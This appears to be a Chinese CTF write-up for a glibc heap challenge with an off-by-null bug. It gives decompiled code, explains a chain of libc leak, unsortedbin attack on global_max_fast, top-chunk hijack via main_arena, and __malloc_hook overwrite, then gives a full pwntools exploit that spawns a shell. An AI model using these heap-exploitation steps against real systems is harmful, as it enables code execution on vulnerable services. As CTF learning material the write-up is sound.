***offbynull + unsortedbinattack + fastbin attack + main_arena ataack***
这个题目就是我一星期没睡好觉的罪魁祸首
在七夕节这天我终于弄懂了！！！！！！！

    while ( 1 )
      {
        choices();
        __isoc99_scanf("%d", &v3);
        switch ( v3 )
        {
          case 2:
            delete();
            break;
          case 3:
            show();
            break;
          case 1:
            add();
            break;
          default:
            puts("invalid~");
            break;
        }
标准的选单题目，但是没有edit函数
做的很绝，delete的时候都清空了，add时先把内存区域清零，而且只能申请0x80以上大小的堆块

    unsigned __int64 add()
    {
      int v1; // [rsp+0h] [rbp-10h]
      int i; // [rsp+4h] [rbp-Ch]
      unsigned __int64 v3; // [rsp+8h] [rbp-8h]
    
      v3 = __readfsqword(0x28u);
      for ( i = 0; i <= 15 && heap_list[i]; ++i )
        ;
      if ( i <= 15 )
      {
        printf("length: ");
        __isoc99_scanf("%d", &v1);
        if ( v1 > 127 && v1 <= 0x10000 )
        {
          heap_list[i] = malloc(v1);
          if ( !heap_list[i] )
          {
            puts("malloc failed.");
            exit(-1);
          }
          memset(heap_list[i], 0, v1);
          puts("your note:");
          suspect((__int64)heap_list[i], v1);
          puts("done.");
        }
        else
        {
          puts("invalid size");
        }
      }
      else
      {
        puts("you can't add anymore.");
      }
      return __readfsqword(0x28u) ^ v3;
    }
——————————————————————————————————————————————————————

    unsigned __int64 sub_D73()
    {
      int v1; // [rsp+4h] [rbp-Ch]
      unsigned __int64 v2; // [rsp+8h] [rbp-8h]
    
      v2 = __readfsqword(0x28u);
      printf("index: ");
      __isoc99_scanf("%d", &v1);
      if ( v1 >= 0 && v1 <= 15 && heap_list[v1] )
      {
        free(heap_list[v1]);
        heap_list[v1] = 0LL;
        puts("done.");
      }
      else
      {
        puts("invalid index.");
      }
      return __readfsqword(0x28u) ^ v2;
    }

主要漏洞点就一个

    unsigned __int64 __fastcall suspect(__int64 a1, unsigned int a2)
    {
      char buf; // [rsp+13h] [rbp-Dh]
      unsigned int i; // [rsp+14h] [rbp-Ch]
      unsigned __int64 v5; // [rsp+18h] [rbp-8h]
    
      v5 = __readfsqword(0x28u);
      for ( i = 0; i < a2; ++i )
      {
        buf = 0;
        if ( read(0, &buf, 1uLL) < 0 )
        {
          puts("Read error.");
          exit(-2);
        }
        if ( buf == 10 )
        {
          *(_BYTE *)(i + a1) = 0;
          return __readfsqword(0x28u) ^ v5;
        }
        *(_BYTE *)(a1 + i) = buf;
      }
      *(_BYTE *)(i + a1) = 0;                       // off by null
      return __readfsqword(0x28u) ^ v5;
    }
这里有一个offbynull漏洞
常规的方法肯定是用不了了，主体的思路就是leak地址，改写maxfast值，而后劫持topchunk指针，改写mallochook，getshell
1.leak
主要的就是利用offbynull的chunkshrink，利用unsortedbin分割产生的fd，bk指针，使其落到其中一个我们可控的堆块内，打印即可
2.改写maxfast
unsorted binattack：把bk改成global_max_fast-0x10,然后重新申请，maxfast的值改成一个很大的数字，这样以后的堆块就全是fastbin范围内的了
以上都是常规操作
3.劫持topchunk
首先需要知道main_arena的结构
从main_arena起始地址开始，第一个地址内存的是flag标志位，而后的七个地址内存的是从0x20--0x80大小的fastbin指针，后面的几个地址不知道干嘛的，但是main+0x58这里存储的是topchunk指针，unsortedbin指向它是因为把它当作头部处理
当我们改写fastbin大小的时候，大于0x80的fastbin会顺序的存储在后面的地址内，这样，我们申请一个大小为c0的堆块（算上头部大小），正好就落在了topchunk的地址内，这样我们就劫持了topchunk
4.修改mallochook
常规的修改mallochook指针的方式是利用fastbinattack，这里由于我们只能申请大于0x80大小的堆块，所以这里采用将topchunk修改为mallochook-0x10，而后从topchunk里申请，值得注意的一点是，由于之前的操作原本的堆结构以及指针已经面目全非，而在我们申请一个堆块的时候检查顺序是遍历所有bin，而后才在topchunk里寻找，这里我们需要维护unsortedbin的两个指针，使其指向自己，原理与劫持topchunk类似，在此不再赘述
具体细节参考exp，注释写的还算详细
exp：

```python
from pwn import *
context.log_level = 'debug'
def add(size,note):
    p.sendlineafter(">> ","1")
    p.sendlineafter("length: ",str(size))
    p.sendafter("note:",note)

def delete(index):
    p.sendlineafter(">> ","2")
    p.sendlineafter("index: ",str(index))

def show(index):
    p.sendlineafter(">> ","3")
    p.sendlineafter("index: ",str(index))

local=1
libc=ELF('./libc.so.6')
if local:
    p=process('./offbyone2')#,env={'LD_PRELOAD':libc.path})
else:
    p=remote('127.0.0.1',10006)

add(0x88,'A'*0x88)#0
add(0x210,'B'*0x1f0+p64(0x200)+p64(0x21)+'\n')#1
add(0x80,'C'*0x80)#2
add(0x80,'D'*0x80)#3
#gdb.attach(p)
delete(1)
#gdb.attach(p)
delete(0)
#gdb.attach(p)
add(0x88,'A'*0x88)


add(0x100,'B'*0x100)#1
#gdb.attach(p)
add(0x80,'D'*0x80)#4
#gdb.attach(p)

delete(1)
#gdb.attach(p)
delete(2)
#gdb.attach(p)
add(0x100,'B'*0x100)#1
#gdb.attach(p)


show(4)
main_arena=u64(p.recvline(keepends=False).ljust(8,'\0'))-0x58
print hex(main_arena)

libc_base=main_arena-libc.symbols['__malloc_hook']-0x10
print hex(libc_base)

system=libc_base+libc.symbols['system']
print "system",hex(system)


malloc_hook=libc_base+libc.symbols['__malloc_hook']
one_gadget = libc_base + 0xe9415
#one_gadget=libc_base+0xf02a4
#global_max_fast=libc_base+0x3c67f8
global_max_fast = main_arena +0x23e0
delete(1)

#gdb.attach(p)
#re arrange the heap structure
add(0x2a0,'a'*0x108+p64(0xc1)+'a'*0xb8+p64(0x91)+'a'*0x88+p64(0x51)+'\n')#1
#split into 3 chunks

delete(1)
#gdb.attach(p)
#add 1 to the unsortedbin
add(0x300,'a\n')#1
#gdb.attach(p)
#now 1 in smallbins
#new chunk from top chunk
#main purpose is to add 1 to smallbin
#because modify maxfast via unsortedbin attack will make
#unsorted bin cant be used any more
delete(4)
#gdb.attach(p)
#add 4 to th unsortedbin

#unsortedbin attack, make fast max = unsorted bin's addr 
add(0x2a0,'a'*0x108+p64(0xc0)+p64(global_max_fast-0x10)+p64(global_max_fast-0x10)+'a'*0xa0+p64(0xc0)+p64(0x91)+'\n')#2
#gdb.attach(p)
add(0xb0,'a\n')#4
#gdb.attach(p)
#raw_input()
#now that since 4 is realloced,
#so that the fake fd,bk now inseted into unsortedbin
#their fd,bk now is unsortedbin's addr
#it is excatly where global_max_fast lies in
#p &global_max_fast
#its a very large number
delete(4)
#hijack topchunk
#insert into fastbin
delete(2)

#insert  the second large chunk,
#which contains our fake chunk structure
#main purpose is to re edit its content
add(0x2a0,'a'*0x108+p64(0xc1)+p64(malloc_hook-0x10)+'\n')#2
#make the fake fd ptr point to malloc_hook-0x10
#global_max insert into smallbin

add(0xb0,'a\n')#4
#now top chunk is mlh4

#now malloc_hook-0x10 inserted into fastbin
delete(2)
#re edit
add(0x2a0,'a'*0x108+p64(0xf1)+'a'*0xe8+p64(0x61)+'\n')#2
# enlarge the fake chunk
delete(4)
#change 4 size to f0
#f->4->mlh-0x10
delete(2)
#reedit
add(0x2a0,'a'*0x108+p64(0xf1)+p64(main_arena+0x58)+'a'*0xe0+p64(0x61)+'\n')#2
#fake fd point to unsorted bin
add(0xe0,'a\n')#4
#f->mlh-10
delete(2)
#reedit
add(0x2a0,'a'*0x108+p64(0xe1)+p64(main_arena+0x58)+'a'*0xd0+p64(0x71)+'\n')#2
#shrink 4's size, 
add(0xd0,'ZZZZZZZZ\n')#5
#4 is used

add(0x80,p64(one_gadget)+'\n')

gdb.attach(p)
delete(4)
#gdb.attach(p)
delete(5)
#gdb.attach(p)
raw_input()
p.interactive()
```

